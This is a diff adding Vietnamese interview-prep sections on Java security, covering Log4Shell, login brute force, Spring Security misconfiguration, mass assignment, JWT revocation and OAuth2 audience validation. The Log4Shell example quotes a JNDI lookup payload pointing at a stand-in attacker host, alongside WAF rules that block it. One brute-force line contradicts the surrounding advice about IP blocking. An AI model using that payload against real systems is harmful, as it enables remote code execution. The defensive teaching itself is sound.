@@ -1258,6 +1258,16 @@ Endpoint "preview URL" nhận URL từ user và fetch để tạo thumbnail. Att
 - **Runtime protection**: Java agent (Contrast, Datadog) detect JNDI lookup.
 - **Logging hygiene**: không log raw user input, sanitize trước khi log.
 
+### Ví dụ đời thực
+- **Triệu chứng**: Hệ thống thanh toán nội bộ ghi header User-Agent vào log bằng Log4j phiên bản 2.14.1. Lúc 2 giờ sáng, bảo mật nhận cảnh báo WAF về request chứa chuỗi \${jndi:ldap://attacker.com:1389/Exploit}. Log4Shell cho phép thực thi mã từ xa (RCE) bằng một dòng ghi log do attacker gửi.
+- **Điều tra**: {{mvn dependency:tree | grep log4j}} thấy log4j-core 2.14.1 (bị ảnh hưởng từ 2.0-beta9 đến 2.14.1). SBOM (danh sách thành phần phần mềm) của release trước cũng kêu thư viện cũ. Nhật ký xác nhận payload đi qua header User-Agent, referer và tham số tìm kiếm.
+- **Nguyên nhân gốc**: Log4j 2.x tự giải mã mẫu \${jndi:...} trong nội dung log. JNDI (dịch vụ Java tra cứu tài nguyên trên mạng, ví dụ LDAP) kết nối đến server của attacker và chạy mã độc.
+- **Cách xử lý**: (1) Nâng log4j-core lên 2.17.1+ (Java 8) và rebuild. (2) Chưa kịp nâng: xoá lớp JndiLookup.class khỏi jar log4j-core. (3) WAF chặn chuỗi jndi: và tường mạng xuất hạn chế kết nối LDAP/RMI. (4) Thêm SCA vào CI để chặn build khi thư viện mới có CVE critical.
+- **Kết quả**: Quét SBOM không còn log4j-core lỗi thời; WAF chặn hơn 5.000 lần thử jndi:, quy trình vá CVE critical thành SLA 24–72 giờ.
+
+### Trả lời mẫu khi phỏng vấn
+"Khi gặp lỗ hổng như Log4Shell, em hoạt động theo quy trình khẩn: trước hết tra SBOM (danh sách thư viện trong ứng dụng) để biết dịch vụ nào dùng Log4j 2.x và phiên bản bao nhiêu. Sau đó containment (chi phối khẩn cuộc tấn công): tường mạng chặn kết nối ra LDAP và RMI, thêm quy tắc WAF chặn chuỗi jndi:, nếu chưa kịp nâng cấp thì xoá lớp JndiLookup khỏi thư viện như Apache khuyến nghị. Patch chính thức là nâng log4j-core lên 2.17.1+ và rebuild toàn bộ dịch vụ bị ảnh hưởng. Em nhấn mạnh việc biết ngay mình đang chạy thư viện nào ở đâu — không có SBOM thì đội dễ bỏ sót dịch vụ. Sau khi khắc phục, em thêm SCA vào CI để build bị chặn nếu thư viện mới có lỗ hổng critical, và diễn tập quy trình vá định kỳ trên staging để đội biết phải làm gì khi CVE mới xuất hiện."
+
 > Senior tip: **Log4Shell là wake-up call cho supply chain security**. Nên đặt thành chuẩn nội bộ: SBOM cho mọi release, SCA gate trong CI/CD, SLA vá critical CVE (ví dụ 24–72h), WAF managed rule tự cập nhật. Không chỉ Log4j — tương tự Spring4Shell (CVE-2022-22965), Jackson gadget. Bài học lớn nhất: **biết ngay mình đang chạy version nào ở đâu** (SBOM + inventory) và có pipeline đủ nhanh để rebuild/redeploy toàn bộ service trong vài giờ.`,
   follow: [
     'Log4j 2.15.0 fix ban đầu bị bypass như thế nào (CVE-2021-45046)?',
@@ -1357,6 +1367,16 @@ public boolean isPwned(String password) {
 - Alert: spike failure rate > 5x baseline, lockout > 100 accounts/15m, new geo login for admin.
 - Dashboard: real-time login heatmap (geo, device, outcome).
 
+### Ví dụ đời thực
+- **Triệu chứng**: Ứng dụng quản lý lương đăng nhập bằng tên tài khoản và mật khẩu. Một ngày số lần đăng nhập sai tăng từ 50 lên hơn 10.000 lần mỗi giờ, hàng chục tài khoản bị khóa. Đây là brute force (thử mật khẩu lặp đi lặp lại) hoặc credential stuffing.
+- **Điều tra**: Xem counter trong Redis (login:fail:user:ten-dang-nhap và login:fail:ip:dia-chi-ip) — botnet, mỗi IP chỉ thử 1-2 lần, nên chặn IP đơn lẻ. Nhật ký cho thấy User-Agent giống nhau, truy cập nhiều tài khoản.
+- **Nguyên nhân gốc**: Chỉ giới hạn theo IP, không giới hạn theo tài khoản, không khóa tăng dần (thời gian khóa dài hơn theo từng lần fail) và không có CAPTCHA.
+- **Cách xử lý**: (1) Giới hạn theo tài khoản (cửa sổ trượt): 5 lần fail khóa 15 phút, 10 lần 1 giờ, 20 lần 24 giờ — exponential backoff. (2) Bật CAPTCHA sau 3-5 lần fail. (3) Khi đăng ký/đổi mật khẩu, đối chiếu PwnedPasswords (dịch vụ tra mật khẩu đã rò rỉ). (4) Trả thông báo chung sai tên tài khoản hoặc mật khẩu cho cả hai trường hợp.
+- **Kết quả**: Số lần đăng nhập sai giảm hơn 90% trong 2 tuần; không ghi nhận đăng nhập thành công từ danh sách mật khẩu rò rỉ trong 60 ngày; điều chỉnh ngưỡng CAPTCHA qua cấu hình động.
+
+### Trả lời mẫu khi phỏng vấn
+"Em bảo vệ endpoint đăng nhập theo lớp: trước hết giới hạn số lần thử theo tài khoản, không chỉ theo IP, vì attacker dùng botnet với nhiều IP. Dùng cửa sổ trượt và khóa tăng dần: 5 lần sai khóa 15 phút, 10 lần 1 giờ, 20 lần 24 giờ, tránh khóa vĩnh viễn làm phiền người dùng hợp pháp. Sau 3-5 lần fail bật CAPTCHA để phân biệt người và máy. Khi đăng ký hoặc đổi mật khẩu, em đối chiếu với PwnedPasswords, dịch vụ công khai liệt kê mật khẩu đã rò rỉ, và luôn trả thông báo chung sai tên tài khoản hoặc mật khẩu để attacker không biết tên nào tồn tại. Theo dõi chỉ số số lần đăng nhập sai và số tài khoản bị khóa, thiết lập cảnh báo khi số liệu vọt lên ngưỡng, và để ngưỡng CAPTCHA trong cấu hình động để điều chỉnh nhanh khi đang bị tấn công mà không phải triển khai lại ứng dụng."
+
 > Senior tip: **Không chỉ rate limit IP** — attacker dùng botnet (nghìn IP). Rate limit per **user** là quan trọng hơn. Lockout phải có **exponential backoff** để không DoS legitimate user. Luôn check **PwnedPasswords** khi đăng ký/đổi pass (NIST SP 800-63B khuyến nghị đối chiếu danh sách mật khẩu đã lộ). Để ngưỡng CAPTCHA/lockout trong config động (feature flag, config server) để chỉnh nhanh khi đang bị tấn công, không cần deploy. Trả cùng một thông báo lỗi cho "sai user" và "sai mật khẩu" để chống dò username. Với ngân hàng: bắt buộc MFA cho mọi login, device registration (trusted device bypass CAPTCHA).`,
   follow: [
     'Rate limit sliding window vs fixed window vs token bucket — khác nhau như thế nào cho login?',
@@ -1427,6 +1447,16 @@ public class SecurityConfig {
 - {{permitAll()}} không có nghĩa là bỏ qua toàn bộ filter; nó chỉ bỏ qua bước **authorization**, các filter khác vẫn chạy.
 - Method security là lớp riêng: URL rule không bảo vệ lời gọi nội bộ giữa các service.
 
+### Ví dụ đời thực
+- **Triệu chứng**: Dev thêm tạm quy tắc cho phép hết vào chuỗi bảo mật Spring Security, rồi quên bỏ; trang quản trị nội bộ truy cập được mà không đăng nhập. Lỗi cấu hình phổ biến: cho phép hết rồi quên siết lại.
+- **Điều tra**: Kiểm thử âm tính bằng MockMvc: gửi request không kèm token tới /api/admin/** mong đợi HTTP 401, thực tế nhận 200. Bật log DEBUG của Spring Security thấy request không qua bộ lọc phân quyền nào vì chuỗi đầu cho phép hết.
+- **Nguyên nhân gốc**: Chuỗi bảo mật không có bộ lọc đường dẫn (securityMatcher) hoặc quy tắc cho phép hết đặt trước quy tắc chặt hơn, nên quy tắc sau không chạy. Nguyên tắc: từ chối theo mặc định.
+- **Cách xử lý**: (1) Xoá quy tắc cho phép hết tạm, chỉ cho phép công khai đường dẫn thực sự cần. (2) Tách nhiều chuỗi bảo mật (SecurityFilterChain) theo thứ tự ưu tiên (@Order) và bộ lọc đường dẫn: chain API stateless cho JWT, chain actuator chỉ mở endpoint sức khỏe. (3) Kiểm thử âm tính mỗi chain: không token → 401, sai quyền → 403, đúng quyền → 200.
+- **Kết quả**: Kiểm thử tự động chặn quy tắc quá rộng trước khi hợp nhất; production không ghi nhận truy cập không ủy quyền vào endpoint nội bộ.
+
+### Trả lời mẫu khi phỏng vấn
+"Em cấu hình bảo mật Spring Security 6 bằng lambda DSL, mỗi nhóm endpoint có một chuỗi bộ lọc riêng (SecurityFilterChain). Nguyên tắc quan trọng nhất: từ chối theo mặc định — mỗi endpoint mới chỉ được mở khi nhóm thêm quy tắc có ý thức, không bao giờ để quy tắc cho phép hết tạm rồi quên bỏ. Khi cần nhiều chuỗi, em dùng bộ lọc đường dẫn (securityMatcher) để mỗi chuỗi chỉ xử lý đường dẫn tương ứng, và chú thích thứ tự (@Order) để sắp xếp: ví dụ chain API stateless cho JWT, chain form-login cho trang quản trị, chain riêng cho actuator chỉ mở endpoint sức khỏe. CORS phải cấu hình tường minh trước bộ lọc xác thực, không thì yêu cầu chuẩn bị OPTIONS bị chặn 401. Khi phát triển, em viết kiểm thử âm tính cho mỗi chuỗi: không token phải 401, sai quyền phải 403, đúng quyền thì 200, và bật log DEBUG của Spring Security khi điều tra để biết bộ lọc nào chặn yêu cầu."
+
 > Senior tip: hãy viết test âm tính cho **từng chain**: không token → 401, token sai scope → 403, token đúng → 200, và kiểm tra actuator. Dùng {{MockMvc}} + {{spring-security-test}} ({{jwt()}}, {{@WithMockUser}}). Khi điều tra trên môi trường thật, bật {{logging.level.org.springframework.security=DEBUG}} để thấy filter nào chặn request; nhớ tắt lại vì log có thể chứa thông tin nhạy cảm. Nguyên tắc thiết kế: **deny by default**, mỗi endpoint mới phải được thêm rule một cách có ý thức.`,
   follow: [
     'Vì sao chain không có securityMatcher lại có thể vô hiệu hoá các chain phía sau?',
@@ -1487,6 +1517,16 @@ public ProfileResponse update(@Valid @RequestBody UpdateProfileRequest req,
 - **JPA dirty checking**: bind vào entity đang managed thì commit ghi luôn, không cần gọi save. Đây là lý do lỗi hay lọt qua test.
 - **API3:2023 Broken Object Property Level Authorization**: OWASP gọi đây là lỗi ở cấp **property**, khác với BOLA/IDOR ở cấp object.
 - Thêm {{@Version}} (optimistic locking) để tránh lost update khi hai request sửa cùng bản ghi.
+
+### Ví dụ đời thực
+- **Triệu chứng**: API cập nhật hồ sơ người dùng nhận JSON từ client và gán trực tiếp vào thực thể JPA. Một attacker gửi thêm trường role là ADMIN vào yêu cầu; server cập nhật cả trường nhạy cảm vì Jackson gán mọi trường có setter công khai. Đây là mass assignment (gán loạt trường) — attacker leo thang quyền.
+- **Điều tra**: Nhật ký thấy trường role của tài khoản bị đổi; review code thấy controller nhận @RequestBody User trực tiếp, bản ghi được lưu nhờ JPA theo dõi trạng thái.
+- **Nguyên nhân gốc**: Gán toàn bộ trường từ yêu cầu vào entity thay vì chỉ cho phép những trường business cần; lấy danh tính và chủ sở hữu từ nội dung yêu cầu thay vì từ phiên đăng nhập đã xác thực.
+- **Cách xử lý**: (1) Dùng DTO (đối tượng truyền dữ liệu) hoặc record Java làm danh sách cho phép: chỉ có họ tên, số điện thoại. (2) Ánh xạ tường minh từ DTO sang entity, không gán thẳng yêu cầu vào entity JPA. (3) Lấy tenantId, ownerId từ token/principal, không tin trường client gửi. (4) Viết kiểm thử hợp đồng gửi trường role là ADMIN và khẳng định giá trị cơ sở dữ liệu không đổi.
+- **Kết quả**: Kiểm thử tự động chặn 100% yêu cầu cố gắng ghi đè trường nhạy cảm.
+
+### Trả lời mẫu khi phỏng vấn
+"Em không bao giờ gán trực tiếp yêu cầu JSON vào thực thể JPA, vì Jackson sẽ gán mọi trường có setter công khai và attacker có thể gửi thêm trường role là ADMIN hoặc balance là 999999 — đây là lỗi mass assignment. Thay vào đó, em dùng DTO hoặc record Java làm danh sách cho phép, chỉ chứa những trường client thực sự cần gửi như họ tên và số điện thoại, rồi ánh xạ tường minh sang entity. Danh tính và chủ sở hữu luôn lấy từ phiên đăng nhập đã xác thực (token), không bao giờ tin trường client gửi như ownerId. Với form truyền thống, em dùng @InitBinder để chỉ cho phép trường cần thiết. Em cũng viết kiểm thử gửi thêm trường nhạy cảm vào yêu cầu và khẳng định giá trị trong cơ sở dữ liệu không thay đổi; kiểm thử này rẻ nhưng phát hiện phần lớn lỗi leo thang quyền ở cấp trường (property)."
 
 > Senior tip: đặt rule code review "controller không bao giờ nhận entity JPA", grep {{@RequestBody}} trong CI là bắt được phần lớn. Viết test contract gửi {{"role":"ADMIN"}} và assert role **không đổi**; test này rẻ hơn nhiều so với sự cố leo thang quyền. Với API công khai, log các field bị bỏ qua ở môi trường staging để phát hiện client gửi thừa, nhưng đừng log toàn bộ body vì có PII.`,
   follow: [
@@ -1552,6 +1592,16 @@ public void revoke(Jwt jwt, RedisTemplate<String, String> redis) {
 - Kiểm tra denylist **sau** khi verify chữ ký; đừng tra Redis bằng dữ liệu chưa xác thực.
 - Log token, đặt token vào query URL (lọt access log/Referer), hoặc lưu token trong {{localStorage}} khi ứng dụng còn rủi ro XSS (script độc đọc được ngay).
 
+### Ví dụ đời thực
+- **Triệu chứng**: Ứng dụng di động ngân hàng dùng JWT làm access token sống 2 giờ. Khách hàng báo đã đổi mật khẩu nhưng thiết bị cũ vẫn chuyển tiền được trong hai giờ sau; access token cũng bị ghi đầy đủ vào nhật ký dịch vụ bên thứ ba, nên token rò rỉ.
+- **Điều tra**: Giải mã JWT thấy không có cơ chế thu hồi; hệ thống chỉ kiểm tra chữ ký và thời gian hết hạn, không có danh sách từ chối (denylist) theo mã định danh token jti, và đổi mật khẩu chỉ xóa phiên web.
+- **Nguyên nhân gốc**: JWT tự chứa thông tin nên sau khi phát hành, mọi dịch vụ chấp nhận cho đến hết hạn; không thu hồi tức thời.
+- **Cách xử lý**: (1) Rút access token xuống 10 phút — cửa sổ rủi ro ngắn và rẻ. (2) Khi đăng xuất hoặc khóa khẩn cấp, ghi jti vào Redis với thời gian sống bằng thời gian còn lại của token. (3) Refresh token dài hơn (8 giờ), chỉ dùng một lần (rotation); nếu phát hiện dùng lại, huỷ toàn bộ chuỗi token của khách hàng. (4) Đổi mật khẩu tăng phiên bản token, làm hết hạn tất cả token cũ.
+- **Kết quả**: Thao tác đăng xuất mọi thiết bị có hiệu lực dưới 10 giây; kiểm thử dùng token đã thu hồi đều nhận 401; chi phí thêm một lần tra Redis mỗi request.
+
+### Trả lời mẫu khi phỏng vấn
+"Em chọn kiểu token theo yêu cầu về thời gian thu hồi. JWT tự chứa thông tin (claims) nên dịch vụ kiểm tra chữ ký không liên lạc, nhanh và mở rộng tốt, nhưng khó thu hồi: token đã phát vẫn hợp lệ đến hết hạn. Opaque token chỉ là chuỗi ngẫu nhiên, mỗi lần dùng phải hỏi máy chủ xác thực, do đó thu hồi tức thời nhưng tạo điểm nghẽn. Thực tế em dùng cách lai: access token JWT ngắn (10 phút), refresh token opaque dài hơn và chỉ dùng một lần (rotation), kèm danh sách từ chối jti trong Redis cho đăng xuất và khóa khẩn cấp. Khi khách hàng đổi mật khẩu, em tăng phiên bản token để mọi token cũ chết ngay. Đối với thao tác rủi ro cao như chuyển tiền, em yêu cầu xác thực lại nhiều bước và cấp token mới tồn tại 2-5 phút. Trước khi chọn kiến trúc, em chốt SLA thu hồi với bên nghiệp vụ, vì con số đó quyết định thời gian sống token và chi phí hạ tầng."
+
 > Senior tip: chốt **revocation SLA** với bên nghiệp vụ trước khi chọn kiến trúc, vì nó quyết định TTL và chi phí hạ tầng. Cấu hình thực tế hay dùng: access 10 phút, refresh 8 giờ có rotation, denylist cho logout và khoá khẩn cấp, version check cho đổi mật khẩu. Đo tỉ lệ cache hit của introspection; đặt alert khi auth server chậm, và luôn có đường fallback đọc JWKS cache khi auth server down.`,
   follow: [
     'Denylist JWT trong Redis chịu được bao nhiêu request/giây, và nút thắt nằm ở đâu?',
@@ -1614,6 +1664,16 @@ JwtDecoder jwtDecoder(OAuth2ResourceServerProperties props) {
 - Forward nguyên token người dùng xuống service nội bộ; nên dùng token exchange (RFC 8693) hoặc client credentials, và **không log** header {{Authorization}}.
 - Đặt claim {{role}} từ client trong token mà không kiểm soát IdP.
 - Dùng chung signing key cho mọi môi trường.
+
+### Ví dụ đời thực
+- **Triệu chứng**: Hệ thống ngân hàng có hai dịch vụ: thanh toán và danh mục. Một ngày nhóm phát hiện dịch vụ danh mục chấp nhận token của dịch vụ thanh toán: attacker gọi API danh mục bằng token đó, vượt quyền hạn.
+- **Điều tra**: Giải mã token thấy trường aud (đối tượng nhận dạng) là payments-api nhưng dịch vụ danh mục không kiểm tra aud; cùng nhà phát hành (issuer) nên token xác thực thành công ở cả hai.
+- **Nguyên nhân gốc**: Chỉ kiểm tra chữ ký và thời gian hết hạn, quên kiểm tra đối tượng nhận dạng; token của dịch vụ A dùng được ở dịch vụ B.
+- **Cách xử lý**: (1) Khai báo đối tượng nhận dạng của mỗi API (ví dụ payments-api) và từ chối token không chứa đối tượng đó. (2) Nếu có nhiều nhà phát hành, dùng JwtIssuerAuthenticationManagerResolver, không lấy issuer từ token để gọi URL bất kỳ. (3) Ánh xạ scope sang quyền (SCOPE_...) và role người dùng (ROLE_...) qua JwtAuthenticationConverter. (4) Giữ issuer-uri để tìm JWKS, đặt timeout ngắn, thử lại khi máy chủ xác thực gặp sự cố.
+- **Kết quả**: Kiểm thử tự động 5 trường hợp (hợp lệ, hết hạn, sai đối tượng, sai nhà phát hành, sai chữ ký) đều đúng; token giữa các dịch vụ bị từ chối HTTP 401.
+
+### Trả lời mẫu khi phỏng vấn
+"Em cấu hình máy chủ tài nguyên OAuth2 không chỉ xác thực chữ ký, mà còn kiểm tra đầy đủ: đối tượng nhận dạng (audience) để token của dịch vụ A không được dùng ở dịch vụ B, nhà phát hành (issuer), và ánh xạ scope của ứng dụng sang quyền truy cập (SCOPE_...) cũng như role của người dùng (ROLE_...). Nếu hệ thống có nhiều nhà phát hành, em chỉ tin những issuer nằm trong danh sách cho phép và không bao giờ lấy issuer từ token rồi gọi URL bất kỳ, tránh nguy cơ gọi máy chủ nội bộ giả mạo. JWKS (danh sách khóa công khai) được tải với timeout ngắn và thử lại khi máy chủ xác thực gặp sự cố, cùng ghi nhớ đệm để ứng dụng vẫn chạy nếu máy chủ đó ngừng hoạt động. Lỗi phải trả 401 kèm header WWW-Authenticate, không trả stack trace. Em viết kiểm thử cho các trường hợp token hợp lệ, hết hạn, sai đối tượng, sai nhà phát hành và sai chữ ký, và rà soát định kỳ xem ứng dụng nào đang xin quyền thừa."
 
 > Senior tip: viết bộ test cho decoder với 5 ca: token hợp lệ, hết hạn, sai audience, sai issuer, chữ ký sai. Kiểm tra thêm trường hợp JWKS trả 500 và assert app vẫn dùng cache. Trong ngân hàng, mỗi API nên có audience riêng và scope tối thiểu; rà soát định kỳ xem client nào đang xin scope thừa. Đừng bao giờ bật tính năng nhận token không chữ ký (alg none) — Nimbus mặc định từ chối, nhưng đừng tự viết decoder.`,
   follow: [
